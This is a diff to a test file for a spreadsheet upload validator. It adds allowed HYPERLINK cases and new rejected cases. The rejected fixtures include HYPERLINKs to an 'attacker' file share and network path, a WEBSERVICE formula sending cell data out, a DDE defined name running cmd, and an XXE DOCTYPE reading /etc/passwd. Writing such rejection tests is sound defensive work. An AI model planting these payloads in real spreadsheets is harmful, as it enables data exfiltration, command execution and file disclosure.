@@ -268,6 +268,9 @@ async function main() {
   const permit3 = await send(await build({ 'xl/worksheets/sheet1.xml': withFormula('&quot;a|b[c]&quot;&amp;A1') }));
   check('permit: a hand-substituted formula with "|" and "[" only inside quoted text is stored', permit3.status === 200,
     `${permit3.status} ${JSON.stringify(permit3.body)}`);
+  const permitLink = await send(await build({ 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(&quot;mailto:office@school.in&quot;,&quot;Write&quot;)&amp;HYPERLINK(&quot;https://tatvaos.com/?id=&quot;&amp;A1)') }));
+  check('permit: mailto and https HYPERLINKs (one completed from a cell) are stored', permitLink.status === 200,
+    `${permitLink.status} ${JSON.stringify(permitLink.body)}`);
   check('…and the substitution really happened (calibration)', withFormula('X') !== text('xl/worksheets/sheet1.xml'));
 
   const hostile: [string, string, Record<string, string | Uint8Array | null>][] = [
@@ -284,6 +287,9 @@ async function main() {
     ['a web-fetching formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('_xlfn.WEBSERVICE(&quot;https://x.example/&quot;&amp;A1)') }],
     ['a defined name that runs DDE', 'calling_out_formula', { 'xl/workbook.xml': text('xl/workbook.xml').replace('</workbook>',
       '<definedNames><definedName name="evil">cmd|\' /c calc\'!A0</definedName></definedNames></workbook>') }],
+    ['a HYPERLINK to a file: address', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(&quot;file://attacker/share/x&quot;,&quot;open&quot;)') }],
+    ['a HYPERLINK to a Windows network path', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(&quot;' + String.fromCharCode(92, 92) + 'attacker' + String.fromCharCode(92) + 'share&quot;)') }],
+    ['a HYPERLINK whose target comes from a cell', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('HYPERLINK(A1,&quot;x&quot;)') }],
     ['a DOCTYPE', 'doctype', { 'xl/sharedStrings.xml': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><sst/>' }],
   ];
   for (const [label, reason, changes] of hostile) {
